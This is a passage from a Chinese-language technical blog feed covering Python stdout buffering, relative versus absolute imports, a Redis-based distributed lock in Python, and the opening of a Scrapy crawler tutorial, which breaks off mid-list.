<h3 id="什么时候应该使用缓冲区"><a href="#什么时候应该使用缓冲区" class="headerlink" title="什么时候应该使用缓冲区"></a>什么时候应该使用缓冲区</h3><p>缓冲区(buffer)原本是用于中和内外存读取速度不同而设计的一个缓冲</p>
<p>因此当读写速度与运算、处理速度不匹配时就应该使用缓冲区</p>
<p>如大量写入文件,尽管可以使用 <code>&quot;n&quot;.join(data_list) </code>来将数据拼接成文本一次写入,但是有时候可能会由于异步、数据结构过于复杂，需要用多个 <code>f.write()</code> 来写入文件,这时就需要使用 buffer</p>
<p>将要写到文件的数据先存入内存中,关闭文件时一次性写入,从而减少了 io 操作次数</p>
<p>另外,引起该篇博文的原因代码是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;;&quot;.join([str(i) for i in range(10000)]))</span><br></pre></td></tr></table></figure>

<p>这段代码在 <strong>Windows</strong> 环境下的 <strong>Python3.9</strong> 以下版本使用 <code>python -u test.py</code> 会导致奇怪的截断</p>
<p>简单解释就是 Windows 7 以下的控制台对写出有限制(64KiB),因此 python 会尝试将输出内容除以 2 来输出<br>最终导致输出内容被截断</p>
<p>该“特性”将在Python3.9被移除<br>相关讨论: <a href="https://stackoverflow.com/questions/54266222/why-does-this-code-print-a-different-result-between-windows-and-linux">StackOverflow: Why does this code print a different result between Windows and Linux?</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>文章中已经存在的链接</li>
<li><a href="https://stackoverflow.com/questions/14258500/python-significance-of-u-option">StackOverflow: Python: significance of -u option?</a></li>
<li><a href="https://www.systutorials.com/241780/how-to-flush-stdout-buffer-in-python/">SystuTorials: How to flush STDOUT buffer in Python?</a></li>
<li><a href="https://oomake.com/question/1001203">码客: 为什么在多线程时关闭标准输出缓冲区？</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>[转]Python 相对导入与绝对导入</title>
    <url>/2020/01/19/python-import/</url>
    <content><![CDATA[<p>Python 相对导入与绝对导入，这两个概念是相对于包内导入而言的。包内导入即是包内的模块导入包内部的模块。</p>
<span id="more"></span>

<h2 id="Python-import-的搜索路径"><a href="#Python-import-的搜索路径" class="headerlink" title="Python import 的搜索路径"></a>Python import 的搜索路径</h2><ul>
<li>在当前目录下搜索该模块</li>
<li>在环境变量 PYTHONPATH 中指定的路径列表中依次搜索</li>
<li>在 Python 安装路径的 lib 库中搜索</li>
</ul>
<h2 id="Python-import-的步骤"><a href="#Python-import-的步骤" class="headerlink" title="Python import 的步骤"></a>Python import 的步骤</h2><p>python 所有加载的模块信息都存放在 <code>sys.modules</code> 结构中，当 import 一个模块时，会按如下步骤来进行</p>
<ul>
<li>如果是 <code>import A</code>，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A</li>
<li>如果是 <code>from A import B</code>，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 <code>__dict__</code> 中</li>
</ul>
<h2 id="相对导入与绝对导入"><a href="#相对导入与绝对导入" class="headerlink" title="相对导入与绝对导入"></a>相对导入与绝对导入</h2><p>绝对导入的格式为 <code>import A.B</code> 或 <code>from A import B</code>，相对导入格式为 <code>from . import B</code> 或 <code>from ..A import B</code>，<code>.</code> 代表当前模块，<code>..</code> 代表上层模块，<code>...</code> 代表上上层模块，依次类推。</p>
<p>相对导入可以避免硬编码带来的维护问题，例如我们改了某一顶层包的名，那么其子包所有的导入就都不能用了。但是 <strong>存在相对导入语句的模块，不能直接运行</strong>，否则会有异常：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ImportError: attempted relative import with no known parent package</span><br></pre></td></tr></table></figure>

<p>这是什么原因呢？我们需要先来了解下导入模块时的一些规则：</p>
<p>在没有明确指定包结构的情况下，Python 是根据 <code>__name__</code> 来决定一个模块在包中的结构的，如果是 <code>__main__</code> 则它本身是顶层模块，没有包结构，如果是 <code>A.B.C</code> 结构，那么顶层模块是 A。基本上遵循这样的原则：</p>
<ul>
<li>如果是绝对导入，一个模块只能导入自身的子模块或和它的顶层模块同级别的模块及其子模块</li>
<li>如果是相对导入，一个模块必须有包结构且只能导入它的顶层模块内部的模块</li>
</ul>
<p>如果一个模块被直接运行，则它自己为顶层模块，不存在层次结构，所以找不到其他的相对路径。</p>
<p>Python2.x 缺省为相对路径导入，Python3.x 缺省为绝对路径导入。绝对导入可以避免导入子包覆盖掉标准库模块（由于名字相同，发生冲突）。如果在 Python2.x 中要默认使用绝对导入，可以在文件开头加入如下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from __future__ import absolute_import</span><br></pre></td></tr></table></figure>

<h2 id="from-future-import-absolute-import"><a href="#from-future-import-absolute-import" class="headerlink" title="from future import absolute_import"></a>from <strong>future</strong> import absolute_import</h2><p>这句 import 并不是指将所有的导入视为绝对导入，而是指禁用 <code>implicit relative import</code>（隐式相对导入）, 但并不会禁掉 <code>explicit relative import</code>（显示相对导入）。</p>
<p>那么到底什么是隐式相对导入，什么又是显示的相对导入呢？我们来看一个例子，假设有如下包结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thing</span><br><span class="line">├── books</span><br><span class="line">│   ├── adventure.py</span><br><span class="line">│   ├── history.py</span><br><span class="line">│   ├── horror.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   └── lovestory.py</span><br><span class="line">├── furniture</span><br><span class="line">│   ├── armchair.py</span><br><span class="line">│   ├── bench.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── screen.py</span><br><span class="line">│   └── stool.py</span><br><span class="line">└── __init__.py</span><br></pre></td></tr></table></figure>

<p>那么如果在 stool 中引用 bench，则有如下几种方式:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bench                 <span class="comment"># 此为 implicit relative import</span></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> bench          <span class="comment"># 此为 explicit relative import</span></span><br><span class="line"><span class="keyword">from</span> furniture <span class="keyword">import</span> bench  <span class="comment"># 此为 absolute import</span></span><br></pre></td></tr></table></figure>

<p>隐式相对就是没有告诉解释器相对于谁，但默认相对与当前模块；而显示相对则明确告诉解释器相对于谁来导入。以上导入方式的第三种，才是官方推荐的，第一种是官方强烈不推荐的，<strong>Python3 中已经被废弃</strong>，这种方式只能用于导入 path 中的模块。</p>
<p>相对与绝对仅针对包内导入而言<br>最后再次强调，相对导入与绝对导入仅针对于包内导入而言，要不然本文所讨论的内容就没有意义。所谓的包，就是包含 <code>__init__.py</code> 文件的目录，该文件在包导入时会被首先执行，该文件可以为空，也可以在其中加入任意合法的 Python 代码。</p>
<p>相对导入可以避免硬编码，对于包的维护是友好的。绝对导入可以避免与标准库命名的冲突，实际上也不推荐自定义模块与标准库命令相同。</p>
<p>前面提到含有相对导入的模块不能被直接运行，实际上含有绝对导入的模块也不能被直接运行，会出现 ImportError：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ImportError: No module named XXX</span><br></pre></td></tr></table></figure>

<p>这与绝对导入时是一样的原因。要运行包中包含绝对导入和相对导入的模块，可以用 <code>python -m A.B.C</code> 告诉解释器模块的层次结构。</p>
<p>有人可能会问：假如有两个模块 a.py 和 b.py 放在同一个目录下，为什么能在 b.py 中 <code>import a</code> 呢？</p>
<p>这是因为这两个文件所在的目录不是一个包，那么每一个 python 文件都是一个独立的、可以直接被其他模块导入的模块，就像你导入标准库一样，它们不存在相对导入和绝对导入的问题。<strong>相对导入与绝对导入仅用于包内部</strong>。</p>
<blockquote>
<p>本文转载于：<a href="http://blog.konghy.cn/2016/07/21/python-import-relative-and-absolute/">Python 相对导入与绝对导入</a></p>
</blockquote>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 使用 Redis 实现分布式锁</title>
    <url>/2020/03/09/redis-lock/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着互联网技术的不断发展，用户量的不断增加，越来越多的业务场景需要用到分布式系统。而在分布式系统中访问共享资源就需要一种互斥机制，来防止彼此之间的互相干扰，以保证一致性，这个时候就需要使用分布式锁。</p>
<span id="more"></span>

<h2 id="业界常用解决方案"><a href="#业界常用解决方案" class="headerlink" title="业界常用解决方案"></a>业界常用解决方案</h2><ul>
<li>基于 MySql 等数据库的唯一索引</li>
<li>基于 ZooKeeper 临时有序节点</li>
<li>基于 Redis 的 <code>NX EX</code> 参数</li>
</ul>
<p>本文主要讲解基于 Redis 实现的分布式锁</p>
<h2 id="分布式锁的特点"><a href="#分布式锁的特点" class="headerlink" title="分布式锁的特点"></a>分布式锁的特点</h2><ul>
<li>互斥性。在任意时刻，只有一个客户端能持有锁</li>
<li>锁超时。即使一个客户端持有锁的期间崩溃而没有主动释放锁，也需要保证后续其他客户端能够加锁成功</li>
<li>加锁和解锁必须是同一个客户端，客户端自己不能把别人加的锁给释放了。</li>
</ul>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="版本一"><a href="#版本一" class="headerlink" title="版本一"></a>版本一</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @DateTime : 2020/3/9 15:36</span></span><br><span class="line"><span class="comment"># @Author   : woodenrobot</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> WatchError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">acquire_lock_with_timeout</span>(<span class="params">conn, lock_name, acquire_timeout=<span class="number">3</span>, lock_timeout=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    基于 Redis 实现的分布式锁</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param conn: Redis 连接</span></span><br><span class="line"><span class="string">    :param lock_name: 锁的名称</span></span><br><span class="line"><span class="string">    :param acquire_timeout: 获取锁的超时时间，默认 3 秒</span></span><br><span class="line"><span class="string">    :param lock_timeout: 锁的超时时间，默认 2 秒</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    identifier = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    lockname = <span class="string">f&#x27;lock:<span class="subst">&#123;lock_name&#125;</span>&#x27;</span></span><br><span class="line">    lock_timeout = <span class="built_in">int</span>(math.ceil(lock_timeout))</span><br><span class="line"></span><br><span class="line">    end = time.time() + acquire_timeout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> time.time() &lt; end:</span><br><span class="line">        <span class="comment"># 如果不存在这个锁则加锁并设置过期时间，避免死锁</span></span><br><span class="line">        <span class="keyword">if</span> conn.setnx(lockname, identifier):</span><br><span class="line">            conn.expire(lockname, lock_timeout)</span><br><span class="line">            <span class="keyword">return</span> identifier</span><br><span class="line">        <span class="comment"># 如果存在锁，且这个锁没有过期时间则为其设置过期时间，避免死锁</span></span><br><span class="line">        <span class="keyword">elif</span> conn.ttl(lockname) == -<span class="number">1</span>:</span><br><span class="line">            conn.expire(lockname, lock_timeout)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release_lock</span>(<span class="params">conn, lockname, identifier</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    释放锁</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param conn: Redis 连接</span></span><br><span class="line"><span class="string">    :param lockname: 锁的名称</span></span><br><span class="line"><span class="string">    :param identifier: 锁的标识</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># python 中 redis 事务是通过pipeline的封装实现的</span></span><br><span class="line">    <span class="keyword">with</span> conn.pipeline() <span class="keyword">as</span> pipe:</span><br><span class="line">        lockname = <span class="string">&#x27;lock:&#x27;</span> + lockname</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># watch 锁, multi 后如果该 key 被其他客户端改变, 事务操作会抛出 WatchError 异常</span></span><br><span class="line">                pipe.watch(lockname)</span><br><span class="line">                iden = pipe.get(lockname)</span><br><span class="line">                <span class="keyword">if</span> iden <span class="keyword">and</span> iden.decode(<span class="string">&#x27;utf-8&#x27;</span>) == identifier:</span><br><span class="line">                    <span class="comment"># 事务开始</span></span><br><span class="line">                    pipe.multi()</span><br><span class="line">                    pipe.delete(lockname)</span><br><span class="line">                    pipe.execute()</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                pipe.unwatch()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> WatchError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h4 id="加锁过程"><a href="#加锁过程" class="headerlink" title="加锁过程"></a>加锁过程</h4><ol>
<li>首先需要为锁生成一个唯一的标识，这里使用 uuid;</li>
<li>然后使用 <code>setnx</code> 设置锁，如果该锁名之前不存在其他客户端的锁则加锁成功，接着设置锁的过期时间防止发生死锁并返回锁的唯一标示；</li>
<li>如果设置失败先判断一下锁名所在的锁是否有过期时间，因为 <code>setnx</code> 和 <code>expire</code> 两个命令执行不是原子性的，可能会出现加锁成功但是设置超时时间失败出现死锁。如果不存在就给锁重新设置过期时间，存在就不断循环知道加锁时间超时加锁失败。</li>
</ol>
<h4 id="解锁过程"><a href="#解锁过程" class="headerlink" title="解锁过程"></a>解锁过程</h4><ol>
<li>首先整个解锁操作需要在一个 Redis 的事务中进行；</li>
<li>使用 <code>watch</code> 监听锁，防止解锁时出现删除其他人的锁；</li>
<li>查询锁名所在的标识是否与本次解锁的标识相同；</li>
<li>如果相同则在事务中删除这个锁，如果删除过程中锁自动失效过期又被其他客户端拿到，因为设置了 <code>watch</code> 就会删除失败，这样就不会出现删除了其他客户端锁的情况。</li>
</ol>
<h3 id="版本二"><a href="#版本二" class="headerlink" title="版本二"></a>版本二</h3><p>如果你使用的 Redis 版本大于等于 <code>2.6.12</code> 版本，加锁的过程就可以进行简化。因为这个版本以后的 <code>Redis set</code> 操作支持 <code>EX</code> 和 <code>NX</code> 参数，是一个原子性的操作。</p>
<ul>
<li>EX seconds ： 将键的过期时间设置为 seconds 秒。 执行 SET key value EX seconds 的效果等同于执行 SETEX key seconds value 。</li>
<li>NX ： 只在键不存在时， 才对键进行设置操作。 执行 SET key value NX 的效果等同于执行 SETNX key value 。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @DateTime : 2020/3/9 15:36</span></span><br><span class="line"><span class="comment"># @Author   : woodenrobot</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> WatchError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">acquire_lock_with_timeout</span>(<span class="params">conn, lock_name, acquire_timeout=<span class="number">3</span>, lock_timeout=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    基于 Redis 实现的分布式锁</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param conn: Redis 连接</span></span><br><span class="line"><span class="string">    :param lock_name: 锁的名称</span></span><br><span class="line"><span class="string">    :param acquire_timeout: 获取锁的超时时间，默认 3 秒</span></span><br><span class="line"><span class="string">    :param lock_timeout: 锁的超时时间，默认 2 秒</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    identifier = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    lockname = <span class="string">f&#x27;lock:<span class="subst">&#123;lock_name&#125;</span>&#x27;</span></span><br><span class="line">    lock_timeout = <span class="built_in">int</span>(math.ceil(lock_timeout))</span><br><span class="line"></span><br><span class="line">    end = time.time() + acquire_timeout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> time.time() &lt; end:</span><br><span class="line">        <span class="comment"># 如果不存在这个锁则加锁并设置过期时间，避免死锁</span></span><br><span class="line">        <span class="keyword">if</span> conn.<span class="built_in">set</span>(lockname, identifier, ex=lock_timeout, nx=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">return</span> identifier</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release_lock</span>(<span class="params">conn, lockname, identifier</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    释放锁</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param conn: Redis 连接</span></span><br><span class="line"><span class="string">    :param lockname: 锁的名称</span></span><br><span class="line"><span class="string">    :param identifier: 锁的标识</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># python中redis事务是通过pipeline的封装实现的</span></span><br><span class="line">    <span class="keyword">with</span> conn.pipeline() <span class="keyword">as</span> pipe:</span><br><span class="line">        lockname = <span class="string">&#x27;lock:&#x27;</span> + lockname</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># watch 锁, multi 后如果该 key 被其他客户端改变, 事务操作会抛出 WatchError 异常</span></span><br><span class="line">                pipe.watch(lockname)</span><br><span class="line">                iden = pipe.get(lockname)</span><br><span class="line">                <span class="keyword">if</span> iden <span class="keyword">and</span> iden.decode(<span class="string">&#x27;utf-8&#x27;</span>) == identifier:</span><br><span class="line">                    <span class="comment"># 事务开始</span></span><br><span class="line">                    pipe.multi()</span><br><span class="line">                    pipe.delete(lockname)</span><br><span class="line">                    pipe.execute()</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                pipe.unwatch()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> WatchError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>


<h3 id="版本三"><a href="#版本三" class="headerlink" title="版本三"></a>版本三</h3><p>可能你也发现了解锁过程在代码逻辑上稍微有点复杂，别着急，我们可以使用 <code>Lua</code> 脚本实现原子性操作从而简化解锁过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @DateTime : 2020/3/9 15:36</span></span><br><span class="line"><span class="comment"># @Author   : woodenrobot</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">acquire_lock_with_timeout</span>(<span class="params">conn, lock_name, acquire_timeout=<span class="number">3</span>, lock_timeout=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    基于 Redis 实现的分布式锁</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param conn: Redis 连接</span></span><br><span class="line"><span class="string">    :param lock_name: 锁的名称</span></span><br><span class="line"><span class="string">    :param acquire_timeout: 获取锁的超时时间，默认 3 秒</span></span><br><span class="line"><span class="string">    :param lock_timeout: 锁的超时时间，默认 2 秒</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    identifier = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    lockname = <span class="string">f&#x27;lock:<span class="subst">&#123;lock_name&#125;</span>&#x27;</span></span><br><span class="line">    lock_timeout = <span class="built_in">int</span>(math.ceil(lock_timeout))</span><br><span class="line"></span><br><span class="line">    end = time.time() + acquire_timeout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> time.time() &lt; end:</span><br><span class="line">        <span class="comment"># 如果不存在这个锁则加锁并设置过期时间，避免死锁</span></span><br><span class="line">        <span class="keyword">if</span> conn.<span class="built_in">set</span>(lockname, identifier, ex=lock_timeout, nx=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">return</span> identifier</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release_lock</span>(<span class="params">conn, lock_name, identifier</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    释放锁</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param conn: Redis 连接</span></span><br><span class="line"><span class="string">    :param lockname: 锁的名称</span></span><br><span class="line"><span class="string">    :param identifier: 锁的标识</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    unlock_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    if redis.call(&quot;get&quot;,KEYS[1]) == ARGV[1] then</span></span><br><span class="line"><span class="string">        return redis.call(&quot;del&quot;,KEYS[1])</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        return 0</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    lockname = <span class="string">f&#x27;lock:<span class="subst">&#123;lock_name&#125;</span>&#x27;</span></span><br><span class="line">    unlock = conn.register_script(unlock_script)</span><br><span class="line">    result = unlock(keys=[lockname], args=[identifier])</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>截至到目前，我们已经有较好的方法获取锁和释放锁。基于Redis单实例，假设这个单实例总是可用，这种方法已经足够安全。但是如果 Redis 主节点挂了就会出现一些问题，比如主节点加锁后没有同步到从节点，从节点升为主节点，就会出现锁的丢失。如果你想要使用更加安全的 Redis 分布式锁实现可以参考一下 <a href="https://redis.io/topics/distlock/#the-redlock-algorithm">Redlock</a> 的实现。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>《Redis 实战》中分布式锁的实现</li>
<li><a href="https://github.com/andymccurdy/redis-py/issues/387">SETNX with TTL · Issue #387 · andymccurdy/redis-py · GitHub</a></li>
<li> <a href="https://mp.weixin.qq.com/s?__biz=MzU0OTk3ODQ3Ng==&mid=2247486884&idx=1&sn=ecd79b960efe4638e5da5db0f6fe9def&chksm=fba6e5a7ccd16cb10ef3cb6e96df79d5c152b597763d9726ff6b855b2680d31f9c9ecf1325e6&mpshare=1&scene=1&srcid=&sharer_sharetime=1578449410632&sharer_shareid=457a571080dcfbb66a2b355b8b090c0a#rd">万字长文！不为人知的分布式锁实现，全都在这里了！
</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy爬虫框架教程（一）-- Scrapy入门</title>
    <url>/2017/01/01/scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89-Scrapy%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>转行做python程序员已经有三个月了，这三个月用Scrapy爬虫框架写了两百多个爬虫，不能说精通了Scrapy，但是已经对Scrapy有了一定的熟悉。准备写一个系列的Scrapy爬虫教程，一方面通过输出巩固和梳理自己这段时间学到的知识，另一方面当初受惠于别人的博客教程，我也想通过这个系列教程帮助一些想要学习Scrapy的人。</p>
<span id="more"></span>
<h1 id="Scrapy简介"><a href="#Scrapy简介" class="headerlink" title="Scrapy简介"></a>Scrapy简介</h1><blockquote>
<p>Scrapy是一个为了爬取网站数据，提取结构性数据而编写的应用框架。 可以应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。<br>其最初是为了 页面抓取 (更确切来说, 网络抓取 )所设计的， 也可以应用在获取API所返回的数据(例如 Amazon Associates Web Services ) 或者通用的网络爬虫。  </p>
</blockquote>
<h1 id="架构概览"><a href="#架构概览" class="headerlink" title="架构概览"></a>架构概览</h1><p><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89--%20Scrapy%E5%85%A5%E9%97%A8scrapy_architecture.png"></p>
<h2 id="各组件作用"><a href="#各组件作用" class="headerlink" title="各组件作用"></a>各组件作用</h2><h3 id="Scrapy-Engine"><a href="#Scrapy-Engine" class="headerlink" title="Scrapy Engine"></a>Scrapy Engine</h3><blockquote>
<p>引擎负责控制数据流在系统中所有组件中流动，并在相应动作发生时触发事件。 详细内容查看下面的数据流(Data Flow)部分。  </p>
</blockquote>
<p>此组件相当于爬虫的“大脑”，是整个爬虫的调度中心。</p>
<h3 id="调度器-Scheduler"><a href="#调度器-Scheduler" class="headerlink" title="调度器(Scheduler)"></a>调度器(Scheduler)</h3><blockquote>
<p>调度器从引擎接受request并将他们入队，以便之后引擎请求他们时提供给引擎。</p>
</blockquote>
<p>初始的爬取URL和后续在页面中获取的待爬取的URL将放入调度器中，等待爬取。同时调度器会自动去除重复的URL（如果特定的URL不需要去重也可以通过设置实现，如post请求的URL）</p>
<h3 id="下载器-Downloader"><a href="#下载器-Downloader" class="headerlink" title="下载器(Downloader)"></a>下载器(Downloader)</h3><blockquote>
<p>下载器负责获取页面数据并提供给引擎，而后提供给spider。</p>
</blockquote>
<h3 id="Spiders"><a href="#Spiders" class="headerlink" title="Spiders"></a>Spiders</h3><blockquote>
<p>Spider是Scrapy用户编写用于分析response并提取item(即获取到的item)或额外跟进的URL的类。 每个spider负责处理一个特定(或一些)网站。 </p>
</blockquote>
<h3 id="Item-Pipeline"><a href="#Item-Pipeline" class="headerlink" title="Item Pipeline"></a>Item Pipeline</h3><blockquote>
<p>Item Pipeline负责处理被spider提取出来的item。典型的处理有清理、 验证及持久化(例如存取到数据库中)。  </p>
</blockquote>
<p>当页面被爬虫解析所需的数据存入Item后，将被发送到项目管道(Pipeline)，并经过几个特定的次序处理数据，最后存入本地文件或存入数据库。</p>
<h3 id="下载器中间件-Downloader-middlewares"><a href="#下载器中间件-Downloader-middlewares" class="headerlink" title="下载器中间件(Downloader middlewares)"></a>下载器中间件(Downloader middlewares)</h3><blockquote>
<p>下载器中间件是在引擎及下载器之间的特定钩子(specific hook)，处理Downloader传递给引擎的response。 其提供了一个简便的机制，通过插入自定义代码来扩展Scrapy功能。</p>
</blockquote>
<p>通过设置下载器中间件可以实现爬虫自动更换user-agent、IP等功能。</p>
<h3 id="Spider中间件-Spider-middlewares"><a href="#Spider中间件-Spider-middlewares" class="headerlink" title="Spider中间件(Spider middlewares)"></a>Spider中间件(Spider middlewares)</h3><blockquote>
<p>Spider中间件是在引擎及Spider之间的特定钩子(specific hook)，处理spider的输入(response)和输出(items及requests)。 其提供了一个简便的机制，通过插入自定义代码来扩展Scrapy功能。</p>
</blockquote>
<h2 id="数据流-Data-flow"><a href="#数据流-Data-flow" class="headerlink" title="数据流(Data flow)"></a>数据流(Data flow)</h2><blockquote>
<ol>
<li><p>引擎打开一个网站(open a domain)，找到处理该网站的Spider并向该spider请求第一个要爬取的URL(s)。</p>
</li>
<li><p>引擎从Spider中获取到第一个要爬取的URL并在调度器(Scheduler)以Request调度。</p>
</li>
<li><p>引擎向调度器请求下一个要爬取的URL。</p>
</li>
<li><p>调度器返回下一个要爬取的URL给引擎，引擎将URL通过下载中间件(请求(request)方向)转发给下载器(Downloader)。</p>
</li>
<li><p>一旦页面下载完毕，下载器生成一个该页面的Response，并将其通过下载中间件(返回(response)方向)发送给引擎。</p>
</li>
